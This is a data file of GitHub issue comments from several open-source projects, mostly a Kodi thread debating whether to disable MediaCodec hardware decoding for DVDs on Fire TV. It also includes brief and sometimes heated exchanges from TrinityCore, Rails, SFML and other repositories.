xbmc/xbmc/15405/460065694,15405,"Im sorry, but I disagree. you can't expect Amazon to fix something they don't have any reason to consider broken. From their point of view anything not working in Kodi on FireTV is fine. FireTV is a vehicle to sell more Amazon content, not a friendly and cooperative environment to run things that tend to sell less Amazon content. Obviously this Mediacodec topic is a thing that makes people unhappy. Some want in on by default, some want it off by default. I propose to have it on by default unless the content is a DVD. That seems to be what it was before Kodi 18 and I never even noticed its existence - it just worked. Now it is on by default and I am forced to switch it off manually when playing DVD content. So by removing a ""workaround"" (I would prefer to call that a ""feature"") you force me to manually toggle a switch that is hidden in the advanced settings - probably for good reasons. I would prefer not having to fiddle around in settings every time I change the type of content I intend to play. Please reconsider my request to introduce a setting ""Disable Mediacodec when playing DVDs"". It doesn't look like a complicated thing to implement. ",,False
xbmc/xbmc/15405/460070991,15405,Here  - results will be called androidswmpeg2 - it will (other than the name tells) stop dvd acceleration for mediacodec - result is uploaded here  in some minutes. ,,False
xbmc/xbmc/15405/459981220,15405,"This indeed helped. Thank you. I am sorry but I fail to make sense of this.  If ""Mediacodec"" is something within Kodi then Kodi 18 introduced a bug that wasn't present in 17.6. In this case a reference to the vendor implementation would not apply. If ""Mediacodec"" is something within Fire TV then it is still the same as it was with Kodi 17.6. Why would it be less stable when used with Kodi 18.0?  ",,False
xbmc/xbmc/15405/460157334,15405,I'm probably facing the same issues as Robert Dahlem on my Beelink GT1 with stuttering dvds. I'll try the test build and will report the results later. ,,False
xbmc/xbmc/15405/460194751,15405,I tested kodi-20190203-6958f4c5-androidswmpeg2-armeabi-v7a.apk as fresh install as well as installed over my 18.0 configuration. It plays DVDs perfectly without stuttering now. Thank you! ,,False
xbmc/xbmc/15405/460277963,15405,"I can disable for mpeg4 &lt; 720 width again. Will upload a tesbuild tonight. Am Mo., 4. Feb. 2019, 1325 hat Markman-B notifications@friend.com geschrieben ",,False
xbmc/xbmc/15405/460231280,15405,Playing dvds works fine in this version. I only had to change a system setting for DTS sound to work correctly. ,,False
xbmc/xbmc/15405/460224422,15405,"I also have the same problem but on .avi files (mpeg4 - xvid codec). Disabling mediacodec works fine (stuttering is gone) - But more cpu load and way more battery usage coz of disabling hardware acceleration. Also tested that Kodi build from @friend - but didnt solve my problem (sure, its another codec). But generally with the build from @friend other codecs are playing better (I think) - less cpu load on activated hardware acceleration Edit Android 8.1 (non rooted) Google Nexus 5x Problem recognized since Kodi v.18.0 (clean installed w/o any plugins from google play store) ",,False
xbmc/xbmc/15405/460309548,15405,"No problem. Let's try. Am Mo., 4. Feb. 2019, 1606 hat MisterT87 notifications@friend.com geschrieben ",,False
xbmc/xbmc/15405/460282077,15405,Nice thank you (just for interest the only mpeg4 files I have tested was SD quality). So like mpeg2 before - you only disable hardware acceleration for this two codecs ? Is there anyway to fix later ? Sure the problem is gone for now but the downside is more battery usage (cpu load). So i think for future proof is to fix it not only disabling it or is there some misunderstood of me ? EDIT I am not that Android pro and not familiar with android coding and so on... ,,False
xbmc/xbmc/15405/460366724,15405,Will result in very same folder in roughly 60 minutes. More I cannot do for you. Bye -) ,,False
xbmc/xbmc/15405/460533058,15405,"Thx. That will fix everything. EDIT it's on Kodi test servers... Yes that works nicely for 720x576 SW decoding and rendering, but All acceleration options have gone missing in Kodi settings. That whole section is missing. ",,False
xbmc/xbmc/15405/460318339,15405,sure - can you link it here if build is ready ? ) ,,False
xbmc/xbmc/15405/460575735,15405,"Ok, cool. PR inbound to test shortly. Done. ",,False
xbmc/xbmc/15405/460573862,15405,"No time. Feel free to fix it up or send a PR. Remember Android specific settings should not bloat settings.xml which is why I tried to move it to android.xml where it's place is Whenever you send a PR to my repo I will start a build. Am Di., 5. Feb. 2019, 1036 hat wrxtasy notifications@friend.com geschrieben ",,False
xbmc/xbmc/15405/460571108,15405,@friend can you try this instead for SW decode &amp; settings options  to runtime test on AML Linux Leia... ,,False
xbmc/xbmc/15405/460526012,15405,"Better use this  - the rest is only hackery ... it has settings for h264, mpeg2, mpeg4(xvid) and uses the powrevert ... ",,False
xbmc/xbmc/15405/460928219,15405,"For good reason. SW rendering performance has dramatically been degraded. With that approach, neither HW nor SW would have worked flawlessly on the Fire TV. HW decoding DVD/MPEG-2 still works on many devices. And for those devices where it does not work, MediaCodec can be disabled manually. So it still works. Forcing SW decoding means far (and I really mean far) inferior scaling and deinerlacing on modern TVs. And there has been no way of enabling HW decoding in V17 Krypton. So what's the better solution? Kodi V17 performed ""SW emulation"" to get it working. With this android.xml approach, those switches are not accessible by the user either as far as I can see. What about @friend's mentioned blacklist approach? ",,False
xbmc/xbmc/15405/460510744,15405,"Finally some sanity after @friend's well constructed argument. @friend is this just for mpeg2 DVD's or all mpeg2 content &lt;720 ? Any chance we can get All &lt; 800 mpeg2 content SW decoded by adding  test - kodi-20190120-fe68d404-powrevert-armeabi-v7a.apk with commit # fe68d404 is the best I've seen EVER for Android Leia SW decoding and rendering performance on ARM platforms. # d2f0c5f was also good. Tested on a GLES 2.0 Oreo Mi Box and GLES 3.2 MM MINIX U9. Basically I'm trying to get 25i/720x576 mpeg2 DVD's and broadcast TV SW decoded and deinterlacing on Android ARM, without fiddling incessantly with acceleration settings. Current androidswmpeg2-armeabi test .apk's above do not default to SW decoding for 25i/720x576 mpeg2 TV., prob because you are using if (hints.width &lt;= 700) ",,False
xbmc/xbmc/15405/460982751,15405,"I just downgraded to 17.6 to check that. DVDs play fine if Mediacodec is switched on or off. So, no V18 fixed nothing with SW rendering that needed to be fixed, at least not on FireTV. ""Alternative facts""? Do you consider this a contribution to the discussion which should be taken seriously? Because I have my doubts. ",,False
xbmc/xbmc/15405/460970290,15405,"True. Final V18 fixed the SW rendering bottleneck, or at least mitigated it, enabling proper playback of 25fps (incl. interlaced with deinterlace-half) material. All I wanted to say was that people have been asking for HW decoding when SW was badly broken, countering @friend's alternative facts. I think that the real issue is understood now and that it might be safe to re-enable SW for DVD and MPEG-4 ASP SD by default. Probably all of today's Android TV devices can cope with that. SW decoding has quite some downsides though (performance- and quality-wise) and since many devices properly support HW decoding, forcing SW would't be a good solution IMHO (which I understand you are not advocating). ",,False
xbmc/xbmc/15405/460538708,15405,"Tested this APK mpeg4 videos still stuttering like before (with hardware acceleration enabled) ( XBMC Player info from tested file Decoder amc-mpeg4(S)(HW) Pixel-Format Surface MediaInfo AVI 1. Video-Stream MPEG-4 Visual (XviD) 1687 kb/s, 720x400 (169) @ 25,00 fps, MPEG-4 Visual (XviD) (Advanced Simple@friend) (BVOP1) ",,False
xbmc/xbmc/15405/461564365,15405,"A good example is the bugs bunny NTSC iso (VOB container + mpeg2) Does not work at all with h/w on both AFTV devices, but they stutter differently. This ISO plays well on WETEK Hub and shield b.t.w. ",,False
xbmc/xbmc/15405/461521639,15405,"IIRC, the issue is very specific to MPEG2 from dvd, which has some peculiarity (that I can't remember right now) that some h/w decoders chokes upon. Just bring back ""hints.dvd"" from  , one way or another ;) PS Oh  sure why users would scream if DVD MPEG2 is SW decoded? Thanks for the ""quick hack"" comment, btw. You're welcome to try to convince Amazon to fix the issue ;) ",,False
xbmc/xbmc/15405/461547705,15405,People screamed because SW wasn‘t feasible anymore due to a bottleneck in the GLES rendering path. SW means far inferior PQ. HW deinterlacers and scalers are so much better. ,,False
xbmc/xbmc/15405/461320658,15405,"Here you go. There is a solution but it's unacceptable to the Kodi codebase gatekeepers. I cannot be bothered trying to implement an alternative solution at this time, nor spend time Android compiling. It uses the same user configurable HW SW switching as SPMC 16.x / 17  will also need this set of @friend patches for better ARM rendering performance  compile away and Android AML and Fire TV users will have a workable solution. ",,False
xbmc/xbmc/15405/465464093,15405,"Yes. I know, just one number is wrong in android.xml. But I stopped caring. There are guys in this thread knowing better anyways, let's wait on them. Talk is cheap, you know -) Am Mi., 20. Feb. 2019, 0357 hat Aleksey Zimin notifications@friend.com geschrieben ",,False
xbmc/xbmc/15405/465565290,15405,"I would just like to have a working Kodi that plays everything on my Fire TV -)  Now I have it and everything works to my satisfaction! In the future Android ARM devices will have more powerful CPUs, but support for older codecs may disappear from firmware alltogether. Thus there is definitely need to have SW decoding to fall back on.  Out of curiosity, which number is wrong in your android.xml? ",,False
xbmc/xbmc/15405/460983980,15405,"I meant V18 final relative to earlier V18 RC/nightly builds. Anyway, doesn't matter indeed. A good solution needs to be found. ",,False
xbmc/xbmc/15405/465628005,15405,"I have cloned the Kodi master branch, and introduced the same changes into settings.xml, Settings.cpp, Settings.h, and DVDVideoCodecAndroidMediaCodec.cpp.  Compiled and tested -- works just fine.  Plays all DVD ISOs, Blu-ray ISOs, autoframerate, 4K, HDR, all works.  I am running GUI at 720p to allow TV to do the upscaling in most cases, because Kodi does not seem to be able to lower its resolution, i.e. when GUI is set to 1080p, it will upscale all videos to 1080p. Kodi still upscales 480p and 576p files, but this looks fine. Here is the apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1master-armeabi-v7a-androidswmpeg2-mod.apk the apk compiled from fritsch's fork branch androidswmpeg2 with my modifications is here ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodi/kodi18.1RC1-armeabi-v7a-fritsch-androidswmpeg2-mod.apk As far as I can see these apks work the same on my Fire TV 3 pendant.  I am posting this apk for those users who are unable to compile Kodi, but would like a working alternative 18.1 release (or 18.2RC) with SW decoder switches.  It still puzzles me why Kodi developers do not want to include these switches into the main build -- they do not hurt anything, and they help many users of popular Fire TV and other non-Kodi-oriented hardware. ",,False
xbmc/xbmc/15405/461552333,15405,"Oh, so Kodi went to the quick hack rather than fixing the GLES rendering path? Hehe... I think I remember the issue is specific to DVD on filesystem, btw. Pretty sure ISO's didn't have the issue. ",,False
xbmc/xbmc/15405/465571011,15405," be group id=""3"" ",,False
xbmc/xbmc/15405/465665477,15405,Stop posting these builds and whatever. They bring absolutely nothing to this created issue ticket. If this continues i will close and lock it ,,False
xbmc/xbmc/15405/465400794,15405,"Hi, thank you fritsch for your build!  However it has a problem -- the hardware acceleration options do not show under ""Player"" menu.  I modified your build and re-compiled Kodi, putting the settings back into settings.xml instead of android.xml.  This fixed the problem and now there are user-configurable switches to turn software decoding on/off/HD only for mpeg2, mpeg4 and h.264. Here is my build apk ftp//ftp.ccb.jhu.edu/pub/alekseyz/kodiapp-armeabi-v7a-debug.apk I tested this apk on my fire TV 3 and everything works perfectly, DVD, HD, 4K, HDR, autoframerate, etc. This is my first time buiding Kodi.  I am concerned about apk size -- it is over90Mb, whereas your apk is about 60Mb.  I suspect the standard ""make apk"" command maked apk with debugging information -- how can I make a smaller ~60Mb apk? ",,False
xbmc/xbmc/15405/465663665,15405,@friend Thanks for the new builds. Quick question - I wasn't following the difference between the two apks. What is the difference? ,,False
xbmc/xbmc/15405/460957728,15405,"That is not my observation. 17.6 silently switched off Mediacodec for DVDs and fell back to SW rendering with flawless performance. 18.0 did not automatically switch off Mediacodec, DVDs stutter. When I manually switched off Mediacodec DVDs worked. Fritsch's version (18.1 RC1) returned the 17.6 behaviour and DVDs worked out of the box. To sum that up on todays FireTV DVDs do not work with HW rendering and work with SW rendering. I do not dispute that. That leads to a user annoyance we have at least on device (the FireTV) where you would need to manually switch on or off Mediacodec depending on the type of content you watch. I do not advocate ""forcing SW decoding"". What I request is a configuration option that allows me to use Mediacodec in the default case and to switch it off explicitly for DVD material. The former we have already, the latter is my request. Ideally it would switch off DVD HW rendering automatically (like in 17.6) but only if FireTV hardware is detected. One can dream ... I do understand that additional switches are a disputed topic. From my point of view switches come into play when you can't make a sensible choice fitting all cases. Forcing the user to change a setting each time they change content type is not a sensible choice. Deliberately sabotaging DVD playback on the FireTV to force Amazon to fix their Mediacodec will produce nothing you can force Amazon to nil. Instead, users will only see that DVD playback does not work with Kodi 18.0 on FireTV and will stay with 17.6. That is one way to go blacklist Mediacodec for combinations of hardware and content type that are known to malfunction. I would still opt to make that user configurable so people can experiment (i.e. when a new FireOS comes out). ",,False
xbmc/xbmc/15405/465688987,15405,"I agree with @friend.  Amazon has no incentive to fix this, but team KODI does.  KODI should be user driven, and I don't understand why you wouldn't accept code that is already available in order to make all users happy with your platform?  Who would be upset by the ability to make all devices just work? ",,False
xbmc/xbmc/15405/465691499,15405,"@friend, do you still need to be reminded of  ? ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."""" In short ""Amazon FireTV"". From a project manager I would appreciate a less hostile attitude towards users. ",,False
xbmc/xbmc/15405/465712737,15405,"Here, have fun with your 7 devices ",,False
xbmc/xbmc/15405/465687423,15405,"With all due respect, there would be no need for these builds and for this whole thread if developers of team Kodi agreed to allow users to choose to use SW decoding for codecs (mostly mpeg2 and mpeg4, and interlaced h264) that are poorly supported on popular, but NOT designed for Kodi use, platforms like Amazon Fire TV.  I do not think that Amazon cares to support mpeg2 and interlaced formats properly because they have no use for it, and so one would not expect them to work on proper implementation. ",,False
xbmc/xbmc/15405/465688392,15405,Go buy a different device is my advice ,,False
xbmc/xbmc/15405/465709611,15405,"I don't think I'm the only person that believes Amazon as a company has more devices out there (read a larger base for Kodi installs) than AMLogic.  So maybe not every workaround is a required one, but who drew the line on Amazon devices?  Seems really foolish.  You can have a very clean code, but if a large portion of the user base moves to a competitor that DOES work for their device, what good is that strategy?   it is much cheaper to switch software than to switch hardware.  I myself have 7 fire devices that run Kodi. ",,False
xbmc/xbmc/15405/465707759,15405,The only way to help Android is not to add workarounds for every shitty 40 dollar device someone spits out for the sole goal to sell users their own content. Why do you give amazon money and don't expect from them that they fix their product? On the other hand you argue with volunteers that they add workarounds? 2 for AMLogic 3 for Mediatek 2 for FireTV1 3 for FireTV3 1 for FireTV 4K and so on? Is that really the strategy that you want from an OSS mediacenter like kodi with exactly one Android Developer? Buy a 40 dollar device from amazon and expecting that volunteers fix their shit in the freetime is unwise ... ,,False
xbmc/xbmc/15405/465712920,15405,"If Kodi wants to have pure code, they have to offer their own hardware and only support that (Apple style).  However, by its own description it is made to work on many devices, so ""workarounds"" are part of the deal.  I guess that a totally pure codebase that works on only select devices is what you want.  As a developer myself, I can't help but shake my head at how this thread has gone.  It is a sad day in the life of this project. ",,False
xbmc/xbmc/15405/465713672,15405,If you are a developer then you should step up and start fixing stuff instead of demanding workarounds for bad devices. ,,False
xbmc/xbmc/15405/465711444,15405,"Let me ask differently Which workarounds for which device do you find here   is much cheaper to switch software than switch hardware"" &lt;- I believe, that this is cheaper for you - as it's my freetime that is wasted to write the code. ",,False
xbmc/xbmc/15405/465696227,15405,"No, I will not go and buy a different device. I like Fire TV, because it has a lot of content and apps that I use.  Much more than Nvidia Shield.  For example National Geographic/ Science Channel apps are non existent on Android TV but they are well implemented on Fire TV. Fire TV is just not as great natively for my local content, like backed-up DVD and blu-ray ISO's etc., as it is not designed for that.  But  Kodi accomplishes the task of playing local content very well.  I can buy a separate device for Kodi use, but this would be another box with wires connected to my TV, and this is completely unnecessary, as Fire TV hardware is completely capable of playing all my content well enough for my living room TV.  For advanced Kodi use I have libreelec S905X box in my basement home theater system. Why one would want to restrict capabilities of Kodi is beyond my understanding. This looks like team-Kodi is becoming politcal in its decisions instead of user-oriented.  I am all for clean code, reliability and compatibility, but hiding useful and well implemented options like SW decoding from users is unwise. ",,False
xbmc/xbmc/15405/465713721,15405,"It's a sad day for you as developer, demanding workaround stuff from OSS developers while at the same being able to fix the root cause yourself, so that no workarounds would have been needed, this is really sad, especially as your highly wanted workaround is just 10 lines of code ... ",,False
nokogiri/sparklemotion/1736/305814776,1736,am trying to make a script to search by user by entering in there first name it should display the detail of that user this interacts with the file email.xml please help me !!!  i can get it to read the xml doc and display all users i just need someone to give some exmaple code or show me how the hell i am supposed to do this thanks ) ,,False
nokogiri/sparklemotion/1736/373737684,1736,"Hello! Thanks for asking this question! Your request for assistance using Nokogiri will not go unanswered! However, Nokogiri's Github Issues is reserved for reporting bugs or submitting patches. If you ask your question on the mailing list, Team Nokogiri promises someone will provide you with an answer in a timely manner. If you'd like to read up on Team Nokogiri's rationale for this policy, please go to  you so much for understanding! And thank you for using Nokogiri. ",,False
nokogiri/sparklemotion/1736/375953557,1736,"uuhhhh there was a bug with nokogiri its a scuffed gem ???? and annoying and not very user friendly for something that claims to be user friendly On Sat, Mar 17, 2018 at 152 AM, Mike Dalessio notifications@friend.com wrote ",,False
okhttp/square/4274/361078477,4274,if you call  response.body().string() twice like  this response.body().string() response.body().string() you will get this unsolvable error ,,False
SalienCheat/SteamDatabase/156/335493845,156,why cant i set it to only choose zones from planet 18 or 19 so if i want a game only from planet 18 it will only use planet 18 ,,False
SalienCheat/SteamDatabase/156/400028376,156,Because you cannot do that. ,,False
SalienCheat/SteamDatabase/156/400046417,156,@friend Why you can when do that in the game  i just want it so it only does planet 18 ,,False
SalienCheat/SteamDatabase/156/400047915,156,Because this is a bot that maximizes the XP you get. If you want to go manually to Planet 18 then you gotta turn off the bot and do it manually. ,,False
SalienCheat/SteamDatabase/156/400051747,156,is there any fork of this project that allow me to do that @friend ,,False
SalienCheat/SteamDatabase/156/400055625,156,I really want to do it on planet 18 and another planet when it comes i like does the whole script need to be rewritten to just use another planet ???? ,,False
SalienCheat/SteamDatabase/156/400234281,156,@friend can anybody do that please i really only want a game from planet 22 only can do i just change some lines of code and make it only use planet 22 ,,False
SalienCheat/SteamDatabase/156/400234531,156,why @friend ,,False
SalienCheat/SteamDatabase/156/400234659,156,"@friend already said why, stop asking. ",,False
SalienCheat/SteamDatabase/156/400234861,156,BUT CANT YOU JUST CHANGE BESTPLANET IN THE CODE AND SET IT TO PLANET 22 @friend ,,False
SalienCheat/SteamDatabase/156/400235003,156,"Good job, then what do you want from us? Stop mentioning me. ",,False
SalienCheat/SteamDatabase/156/400235162,156,@friend my only question is what i need to change it too for planet 22 ! ,,False
SalienCheat/SteamDatabase/156/400235235,156,Easy Write your own bot. ,,False
SFML/SFML/1556/409028181,1556,"And you removed my issue now, wow, good! Do you know what ? I'll try to set my framework without SFML because I see SFML is not a serious projet. ",,False
SFML/SFML/1556/462544770,1556," The issue was closed with a corresponding reason. This did not prevent you from commenting on why you think it should have been re-opened. You did not provide any information that would help anybody else in resolving the problem, if it was even caused by SFML. You disregarded the very text in the issue template that suggested asking on the forum first about any issues with the usage of SFML before opening an issue, which we prefer only contain confirmed bugs with appropriate information. The issue was not removed. Please familiarize yourself with the way GitHub works before making such claims. Threatening people in any way is not constructive and will not benefit anyone in any way. You are entitled to believe what you want to believe, but making blanket statements such as ""SFML is not a serious project"" on an open platform has a high chance to mislead people into believing it as a fact. As such, in the future please refrain from making such remarks. I have temporarily blocked you from the SFML organization for 7 days. Please take this time to calm down and reflect on what has just happened. If you have any comments regarding the handling of this issue, please either take it to the forum or contact the SFML team via other means. If, after you are unblocked, you intend to continue to post clearly non-constructive content, you will be permanently blocked from the SFML organization. This is your last warning.  Have a pleasant day. ",,False
forgottenserver/otland/2494/354178641,2494,Expected behaviour  behaviour ,,False
forgottenserver/otland/2494/416200370,2494,And the problem is? ,,False
forgottenserver/otland/2494/416305528,2494,"@friend  try it out yourself and compare with the image i provided, you can do so by trapping a monster and walk around it and see which direction it is facing. the problem is that the direction is not coded correctly for monster in some squares. ",,False
forgottenserver/otland/2494/417580047,2494,"@friend You are filing a bug, i think you should post both expected and actual behavior. You posted expected in an image. Then post the actual in a companionable image. ",,False
forgottenserver/otland/2494/417590324,2494,"@friend or you can just recode it after the expected image, i don't see a point in making another image of the broken code (which i did include btw). feel free to spend that time yourself making the image if you really think it is needed. ",,False
forgottenserver/otland/2494/417759787,2494,You are reporting a bug and expects that we try based on a image?! Please provide more information about it and not just a stupid image that you think that it should be. ,,False
forgottenserver/otland/2494/417775273,2494,and you expect me to sit another 30min to draw you a picture instead of just clicking a link that takes 30seconds. wtf dude? ,,False
moby/moby/17195/112269176,17195,"There are numerous open issues in regards to docker and DNS handling within containers (#17190 #16619 #15978 #14627 #15819 and likely many others which I was fuzzy on) One solution I think which would solve all these issues would be if docker acted as a DNS server. It would answer lookup requests for linked containers, and when the request isn't for a linked container, it would forward it upstream (to the host's name servers). The  file inside the container would then be static, containing only the container itself. We could also not touch  at all, and leave the container's entry to DNS. This would allow image builds to manipulate the file and persist the changes. For performance, it would probably be good if docker cached the upstream DNS records. Records come back with a TTL, so docker should cache the record until this TTL expires. ",,False
moby/moby/10248/55068779,10248,"Running my own image on a CentOS 7 host, clean installation, no other jobs running is embarrassing slow. docker run -p 1202012020 zopyx/xmldirector-plone takes in the range 5 to 10 minutes under Docker control. Running the same code on same virtual machine usually takes less than one minute. The image starts eXist-db, pre-allocates the CMS Plone and starts it. The related Dockerfile is here  uses this as base image  the load of the VM goes over the top and climbs up to 10  [ajung@friend ~]$ uname -a Linux docker.zopyx.com 3.10.0-123.el7.x86_64 #1 SMP Mon Jun 30 120922 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux [ajung@friend ~]$ docker version Client version 1.4.1 Client API version 1.16 Go version (client) go1.3.3 Git commit (client) 5bc2ff8 OS/Arch (client) linux/amd64 Server version 1.4.1 Server API version 1.16 Go version (server) go1.3.3 Git commit (server) 5bc2ff8 [ajung@friend ~]$ docker -D info Containers 3 Images 62 Storage Driver devicemapper  Pool Name docker-2531-201327949-pool  Pool Blocksize 65.54 kB  Data file /var/lib/docker/devicemapper/devicemapper/data  Metadata file /var/lib/docker/devicemapper/devicemapper/metadata  Data Space Used 3.474 GB  Data Space Total 107.4 GB  Metadata Space Used 4.448 MB  Metadata Space Total 2.147 GB  Library Version 1.02.82-git (2013-10-04) Execution Driver native-0.2 Kernel Version 3.10.0-123.el7.x86_64 Operating System CentOS Linux 7 (Core) CPUs 3 Total Memory 3.704 GiB Name docker.zopyx.com ID 2CWZEWWZTNZTNHN7H4VEJOENPQZGXVJGAJMH2PVKJYOXE4UY Debug mode (server) false Debug mode (client) true Fds 23 Goroutines 39 EventsListeners 0 Init Path /usr/bin/docker Docker Root Dir /var/lib/docker Username zopyx Registry [",,False
TrinityCore/TrinityCore/17506/163573891,17506,"Description Hello TrinityCore devs. I have noticed that the boss encounter progress panel is not working. I know this is only a cosmetic thing; and TC is appearing to be focused on playability. But many of us are here to study and to learn about how, maybe, a real MMO will be structured back-end. It is nice that a spell works, but it doesn't help with the model of TrinityCore (an educational project). I would really love to learn more from you about this system. Current behaviour Tell us what happens When you enter a dungeon from the instance portal, you do not see the encounter progress panel on the right of the screen. Expected behaviour Tell us what should happen instead On retail, when entering the instance, we will see something like this  Steps to reproduce the problem  Make any character Teleport to the entrance of any dungeon Enter the dungeon  Branch(es) 3.3.5 / 6.x (Select the branch(es) affected by this issue)  6.x TC hash/commit 77f980035a43a9156c22130042d1fb6597139ee0 TDB version 6.04 Operating system Windows 10 ",,False
TrinityCore/TrinityCore/17506/230168357,17506,"I am sure this ticket is duplicate, but can't find original one. ",,False
TrinityCore/TrinityCore/17506/230168535,17506,"I did search for an open ticket too, but did not find one so I created this. ",,False
TrinityCore/TrinityCore/17506/230175897,17506,NO! PLEASE CLOSE! why tc should doing that while all pservers already having this? for make difficulty with merge? better for work on quests and spells which not pservers having. for improving state of private conditions source. ,,False
TrinityCore/TrinityCore/17506/230178172,17506,@friend well this is not only a cosmetic. This makes players to get more bonuses like Experience and Gold.. Thats a huge thing to get fixed  ) ,,False
TrinityCore/TrinityCore/17506/230182344,17506,@friend TC has no business with private servers so if TC implements scenarios on their own they don't have to care about their servers. (Scenarios is the point that is being asked for here.) ,,False
TrinityCore/TrinityCore/17506/230200926,17506,"Wall of text warning I'm working on implementing Scenarios for TrinityCore at the moment, but have been asked to put it on hold for a while, while I spend some time to update and push some uncommited PvE encounter scripts for Dragon Soul / Terrace of Endless Spring and Heart of Fear. Main issue with the scenario system I'm currently working on is the missing information about Criteria Tree operator flags which the scenario system, and achievement system build upon. Basically the operator flags help determine whether or not a criteria has been fulfilled (which Scenarios use to track progress). We currently only know 2 operator flags for processing criteria progresses, and there appears to be at least 2 more that are currently unknown. Basically what doesn't work is if the scenario asks you to kill 30 creatures in the instance, then the criterias behind it might look something like this Description Kill 30 enemies (CriteriaTreeId 123) Amount to complete criteria is determined from the CriteriaTreeId, and that amount is 30 (30 enemies) CriteriaIds to be fullfilled to complete CriteriaTreeId 123 are the following 50,  51, 52. Criteria 50 corresponds to killing creature with entry 1001, 15 times. Criteria 51 corresponds to killing creature with entry 1002, 15 times. Criteria 52 corresponds to killing creature with entry 1005, 15 times. The currently criteria system will then only fulfill the criteriatree, if all criterias are complete. And they  currently  require you to kill exactly 15 of creature entry 1001, 15 of creature entry 1002, and 15 of creature entry 1005. Which is a total of 45, and a strict requirement to kill 15 of a certain creature, when the CriteriaTree asked for 30, from any of those criterias listed. This is the behavior that I've observed so far, but I could use some help from Shauren to verify this and see if he has any idea of what the currently unknown operator flags might do. There's also another problem with the criteria UI, and I believe it's related to a loading screen issue currently present in TrinityCore. When you get a loading screen, you bar will fill up to indicate loading progress, just like retail. However when it reaches 100% on trinitycore, the loading bar disappears after a small delay, without removing the loading screen itself. The loading screen eventually goes away but it has already caused an impact in displaying the scenario UI, whos opcode has been sent properly. Resending the scenario UI opcode whilst playing will correctly show the UI. These 2 problems are currently impeding the progress of pushing this feature, so if you have any knowledge about helping/fixing this, please contact me. The 2 issues recapped  Unknown CriteriaTree.db2 operator flags TrinityCore Loading screen issue (I might be very wrong about this being the root cause for the scenario UI not showing, if sent during the loading screen)  ",,False
TrinityCore/TrinityCore/17506/230202216,17506,"So I was wrong, this is more than a cosmetic issue. I am now even more intrigued about this Scenario system. Maybe you can push a PR to TC and the community can improve / complete the system? I'm very interested to look at your work. ",,False
TrinityCore/TrinityCore/17506/230215382,17506,@friend Loading screens should have been fixed 3 weeks ago - 2fe6fc63d79655a96ee2135a6b380ce353729088 ,,False
TrinityCore/TrinityCore/17506/230220129,17506,@friend Great! Sorry for refering to outdated rev. ,,False
TrinityCore/TrinityCore/17506/230326143,17506,"@friend better to not make pr. why to do pr of scinario to tc? all pserver have already this. only to making merge conflict? for making battle with git?! open sources dose not need it! do the encounter script, the ""Dragon Soul / Terrace of Endless Spring and Heart of Fear"" is lot better for you. pls. many respect to tc devs, but pls close issue. ",,False
TrinityCore/TrinityCore/17506/230328385,17506,"@friend please kindly fuck off and mind your own server with this attitude. While at it please also don't use TrinityCore as you clearly already have everything fixed, don't need anything here except just leeching things you are unable to fix yourself. ",,False
TrinityCore/TrinityCore/17506/236120101,17506,@friend you know a simple thank you goes a long way? It shows you are nothing more than a Leech! Who the ---- do you think you are dictating what and what the opensource needs? As for your request to get something done... How about placing a bounty on it so the person who caters to you actually gains something for providing you what you want since you cant provide fixes. If you are running a pserver which mind you is NOT supported by TC or any other core development community this means you are gaining from it in some way or you would not be doing it how about throwing the dev team a Monitory tip for their efforts. Clearly you are too incompetent. Or hey wait even better.. Learn to code and move away from TrinityCore. WAIT A F--ken moment here So you have that working and yet you didn't provide a solution or p/r? You have no one to blame but yourself for merge conflicts because you didn't offer a p/r  Here's your tissue mate. I Second Shauren in his statement. @friend Nice response! I could not say it any better )  @ Trinity Development Team and Community You guys rock and Don't let people like this discourage you. People like ViktorIvanenko Hold very little value and only acts for their own gain not anyone else. ,,False
rails/rails/594/904177,594,"Imported from Lighthouse. Original ticket at  by Damien MATHIEU - 2011-02-17 080723 UTC When exporting OrderedHash objects with to_json or to_xml, they become arrays and doesn't stay as hashes. With those methods, they're exported as if they were hashes. ",,False
rails/rails/594/1168803,594,Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-07 223546 UTC Did I use the inappropriate method to suggest a patch ? ,,False
rails/rails/594/1168804,594,Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 084012 UTC So I guess not. Whatever. Thanks anyway for not even taking a few seconds to look at my patch. ,,False
rails/rails/594/1168805,594,Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094012 UTC How about doing something like the following? This way we won't need to maintain the code for cerating JSON and XML in multiple places. ,,False
rails/rails/594/1168806,594,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 094353 UTC Oh btw, that attitude is not very nice. I would have not replied if I had seen your last comment. People are busy with work and busy creating/fixing code that you can use, for free. It's also stated very clear in the explanation in the right hand bar. But I guess you didn't read that. “Then don't get your hopes up. Unless you have a ""Code Red, Mission Critical, The World is Coming to an End"" kinda bug, you're creating this ticket in the hope that others with the same problem will be able to collaborate with you on solving it. Do not expect that the ticket automatically will see any activity or that others will jump to fix it. Creating a ticket like this is mostly to help yourself start on the path of fixing the problem and for others to sign on to with a ""I'm having this problem too""..” ",,False
rails/rails/594/1168807,594,"Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094358 UTC Because if we move from an OrderedHash to an hash, we're losing the order in 1.8 ? ",,False
rails/rails/594/1168808,594,Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 094549 UTC And sorry for the harsh message. I must admit that it's quite frustrating to see other tickets being assigned or at least having someone show an interest to it and feel alone with his ticket not being replied ;) ,,False
rails/rails/594/1168809,594,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 095104 UTC Yes that's true, but is it important for JSON and XML? (I don't know) I understand, but such emotional messages never help. But enough about this. ",,False
rails/rails/594/1168810,594,"Imported from Lighthouse. Comment by Damien MATHIEU - 2009-02-10 095332 UTC Well in my case it was. I have a date for every key of the hash (in the format ""YYYY-MM-DD) and I need it to be ordered by date, even when I give it in json or xml (otherwise the application using the feed need to reorder it). ",,False
rails/rails/594/1168811,594,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100533 UTC At least in JSON the spec (json.org) says clearly “An object is an unordered set of name/value pairs. An object begins with { (left brace) and ends with } (right brace). Each name is followed by  (colon) and the name/value pairs are separated by , (comma).” From googling it seems that in XML the same applies, but I haven't found a definitive answer yet so you'd have to look this up more thoroughly. ",,False
